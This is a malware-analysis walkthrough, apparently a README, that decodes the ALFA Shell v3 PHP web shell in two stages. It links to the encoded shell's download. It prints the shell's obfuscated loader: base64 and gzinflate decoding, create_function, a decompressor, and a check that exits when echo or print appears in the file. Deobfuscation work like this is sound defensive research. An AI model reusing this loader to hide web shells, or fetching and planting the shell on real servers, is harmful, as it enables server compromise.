# DeObfuscation ALFA SHELL V3

### How to decode ALFA SHELL V3?

1 - Download encode shell : http://getalfa.rf.gd/?i=1 <br />

2 - Open file `alfav3-encoded.php` we will see `$MuSoTSurZq='e'.'v'.'al'.'';`  <br />

Link Image 1 <br />

### Start Stage 1

3 - Replace`$MuSoTSurZq='e'.'v'.'al'.'';` to `$MuSoTSurZq='echo';` <br /> 

Link Image 2 <br />

4 - Now we should run `php alfav3-encoded.php > decode_stage_1.php` <br />


5 - Again encoded ALFA, We see intersting message :

``` /* You're killing me again 🎧 Am I still in your head ? 🎧 You used to light me up 🎧 Now you shut me down -- Solevisible */ ```

This message of music `Archive - Again ` Music linke : https://www.youtube.com/watch?reload=9&v=NF52fcoIqg4

### Start Stage 2

6 -
```php
$阿尔法词=十六进制转换('666736736265687075726134636f5f746e646978');$函数存在=$阿尔法词{0}.$阿尔法词{8}.$阿尔法词{16}.$阿尔法词{12}.$阿尔法词{15}.$阿尔法词{18}.$阿尔法词{13}.$阿尔法词{16}.$阿尔法词{14}.$阿尔法词{5}.$阿尔法词{19}.$阿尔法词{18}.$阿尔法词{3}.$阿尔法词{15}.$阿尔法词{3};function 十六进制转换($十六进制){$串='';for($计数=0;$计数<strlen($十六进制);$计数+=2)$串.=chr(hexdec(substr($十六进制,$计数,2)));return $串;}function 编码器($串){return __ZGVjb2Rlcg($串);}function 随机($串){return ord($串);}function 内容($串){return @file_get_contents($串);}if(!$函数存在("阿尔法功能启动")){function 阿尔法功能启动($阿尔法变量的一个){$阿尔法变量的一个=编码器($阿尔法变量的一个);$阿尔法功能启动=0;$阿尔法两个变量=0;$阿尔法变三=0;$阿尔法四个变量=(随机($阿尔法变量的一个[1])<<8)+随机($阿尔法变量的一个[2]);$阿尔法五个变量=3;$阿尔法六个变量=0;$阿尔法七个变量=16;$阿尔法变八="";$阿尔法九变=strlen($阿尔法变量的一个);$阿尔法变量十=__FILE__;$阿尔法变量十=内容($阿尔法变量十);$阿尔法变量十一=0;preg_match(编码器("LyhwcmludHxzcHJpbnR8ZWNobykv"),$阿尔法变量十,$阿尔法变量十一);for(;$阿尔法五个变量<$阿尔法九变;){if(count($阿尔法变量十一)) exit;if($阿尔法七个变量==0){$阿尔法四个变量=(随机($阿尔法变量的一个[$阿尔法五个变量++])<<8);$阿尔法四个变量+=随机($阿尔法变量的一个[$阿尔法五个变量++]);$阿尔法七个变量=16;}if($阿尔法四个变量&0x8000){$阿尔法功能启动=(随机($阿尔法变量的一个[$阿尔法五个变量++])<<4);$阿尔法功能启动+=(随机($阿尔法变量的一个[$阿尔法五个变量])>>4);if($阿尔法功能启动){$阿尔法两个变量=(随机($阿尔法变量的一个[$阿尔法五个变量++])&0x0F)+3;for($阿尔法变三=0;$阿尔法变三<$阿尔法两个变量;$阿尔法变三++)$阿尔法变八[$阿尔法六个变量+$阿尔法变三]=$阿尔法变八[$阿尔法六个变量-$阿尔法功能启动+$阿尔法变三];$阿尔法六个变量+=$阿尔法两个变量;}else{$阿尔法两个变量=(随机($阿尔法变量的一个[$阿尔法五个变量++])<<8);$阿尔法两个变量+=随机($阿尔法变量的一个[$阿尔法五个变量++])+16;for($阿尔法变三=0;$阿尔法变三<$阿尔法两个变量;$阿尔法变八[$阿尔法六个变量+$阿尔法变三++]=$阿尔法变量的一个[$阿尔法五个变量]);$阿尔法五个变量++;$阿尔法六个变量+=$阿尔法两个变量;}}else $阿尔法变八[$阿尔法六个变量++]=$阿尔法变量的一个[$阿尔法五个变量++];$阿尔法四个变量<<=1;$阿尔法七个变量--;if($阿尔法五个变量==$阿尔法九变){$阿尔法变量十=implode("",$阿尔法变八);$阿尔法变量十="?".">".$阿尔法变量十;return $阿尔法变量十;}}}
}
print_r(阿尔法功能启动(""));
eval(阿尔法功能启动("QAAAPD9waH .... "));
```
I change code of stage 2 of chines language `decode_stage_2.php`: 

```php

<?php

$txjCEtOsnV='f'.'u'.'nc'.'t'.'io'.'n'.'_'.'exist'.'s';
$AiFWszqQIS='cha'.'r'.'Cod'.'eAt';$XBHjjUIPPF='echo';
$HchfyPfIrM='gzinfl'.'ate';if(!$txjCEtOsnV('b'.'a'.'s'.'e'.'6'.'4'.'_e'.'n'.'c'.'od'.'e'.'')){function VVjQyGUShF($data){if(empty($data))return;$b64='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';$o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;$ac = 0;$enc = '';$tmp_arr = array();if(!$data){return $data;}do{$o1 = $AiFWszqQIS($data, $i++);$o2 = $AiFWszqQIS($data, $i++);$o3 = $AiFWszqQIS($data, $i++);$bits = $o1 << 16 | $o2 << 8 | $o3;$h1 = $bits >> 18 & 0x3f;$h2 = $bits >> 12 & 0x3f;$h3 = $bits >> 6 & 0x3f;$h4 = $bits & 0x3f;$tmp_arr[$ac++] = charAt($b64, $h1).charAt($b64, $h2).charAt($b64, $h3).charAt($b64, $h4);} while ($i < strlen($data));$enc = implode($tmp_arr, '');$r = (strlen($data) % 3);return ($r ? substr($enc, 0, ($r - 3)) : $enc).substr('===', ($r || 3));}function charCodeAt($data, $char){ return ord(substr($data, $char, 1));}function charAt($data, $char){return substr($data, $char, 1);}}else{function VVjQyGUShF($s){$b='b'.'a'.'s'.'e'.'6'.'4'.'_e'.'n'.'c'.'od'.'e'.'';return $b($s);}}if(!$txjCEtOsnV('ba'.'se6'.'4_d'.'e'.'c'.'ode')){function prGVlydQcW($input){if(empty($input))return;$keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";$chr1 = $chr2 = $chr3 = "";$enc1 = $enc2 = $enc3 = $enc4 = "";$i = 0;$output = "";$input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);do{$enc1 = strpos($keyStr, substr($input, $i++, 1));$enc2 = strpos($keyStr, substr($input, $i++, 1));$enc3 = strpos($keyStr, substr($input, $i++, 1));$enc4 = strpos($keyStr, substr($input, $i++, 1));$chr1 = ($enc1 << 2) | ($enc2 >> 4);$chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);$chr3 = (($enc3 & 3) << 6) | $enc4;$output = $output . chr((int) $chr1);if ($enc3 != 64) {$output = $output . chr((int) $chr2);}if ($enc4 != 64) {$output = $output . chr((int) $chr3);}$chr1 = $chr2 = $chr3 = "";$enc1 = $enc2 = $enc3 = $enc4 = "";}while($i < strlen($input));return $output;}}else{function prGVlydQcW($s){$b='ba'.'se6'.'4_d'.'e'.'c'.'ode';return $b($s);}}$lOUhvmLHrl='c'.'reat'.'e'.'_'.'funct'.'i'.'on';$BLKLPTRwbV = $lOUhvmLHrl('$lY',$XBHjjUIPPF.'('.$HchfyPfIrM.'('.'pr'.'G'.'V'.'lyd'.'Q'.'c'.'W'.'($lY)'.')'.')'.';');


$keys=func_1('666736736265687075726134636f5f746e646978');

$split_keys=$keys{0}.$keys{8}.$keys{16}.$keys{12}.$keys{15}.$keys{18}.$keys{13}.$keys{16}.$keys{14}.$keys{5}.$keys{19}.$keys{18}.$keys{3}.$keys{15}.$keys{3};
function func_1($arg_1){
    $串='';
    for($i=0;$i<strlen($arg_1);$i+=2)
    $串.=chr(hexdec(substr($arg_1,$i,2)));
    return $串;
}

function __ZGVjb2Rlcg($s)
{
    return prGVlydQcW($s);
}

function func_2($串){
        return __ZGVjb2Rlcg($串);
}
function func_3_ord($串){
        return ord($串);
}
function func_4($串){
        return @file_get_contents($串);
}

if(!$split_keys("func_5")) {
        $func_5_arg = "";
            $func_5_arg=func_2($func_5_arg);
            $func_5=0;
            $counter=0;
            $Counter_5=0;
            $var_2=(func_3_ord($func_5_arg[1])<<8)+func_3_ord($func_5_arg[2]);
            $Counter_2=3;
            $Counter_3=0;
            $Counter_4=16;
            $ret_str="";
            $get_length_arg=strlen($func_5_arg);
            $get_files=__FILE__;
            $get_files=func_4($get_files);
            $get_files一=0;
            preg_match(func_2("LyhwcmludHxzcHJpbnR8ZWNobykv"),$get_files,$get_files一);

            for(;$Counter_2<$get_length_arg;){
         
                if($Counter_4==0){
                    $var_2=(func_3_ord($func_5_arg[$Counter_2++])<<8);
                    $var_2+=func_3_ord($func_5_arg[$Counter_2++]);
                    $Counter_4=16;
                }
                if($var_2&0x8000){
                    $func_5 = (func_3_ord($func_5_arg[$Counter_2++])<<4);
                    $func_5 += (func_3_ord($func_5_arg[$Counter_2])>>4);
                    if($func_5){
                        $counter=(func_3_ord($func_5_arg[$Counter_2++])&0x0F)+3;
                        for($Counter_5=0;$Counter_5<$counter;$Counter_5++)
                            $ret_str[$Counter_3+$Counter_5] = $ret_str[$Counter_3-$func_5+$Counter_5];
                            $Counter_3+=$counter;
                        }
                        else{
                            $counter=(func_3_ord($func_5_arg[$Counter_2++])<<8);
                            $counter+=func_3_ord($func_5_arg[$Counter_2++])+16;
                            for($Counter_5=0;$Counter_5<$counter;
                            $ret_str[$Counter_3+$Counter_5++]=$func_5_arg[$Counter_2]);
                            $Counter_2++;
                            $Counter_3+=$counter;
                        }
                    }
                    else
                    $ret_str[$Counter_3++]=$func_5_arg[$Counter_2++];
                    $var_2<<=1;
                    $Counter_4--;
                    if($Counter_2==$get_length_arg){
                        echo $ret_str;
                    }
        }
}

```

7 - Again we run `php decode_stage_2.php > final_alfashell.php` seccessfully decode ALFA SHELL :),


Thanks,
Ramin - kernel security engineering 
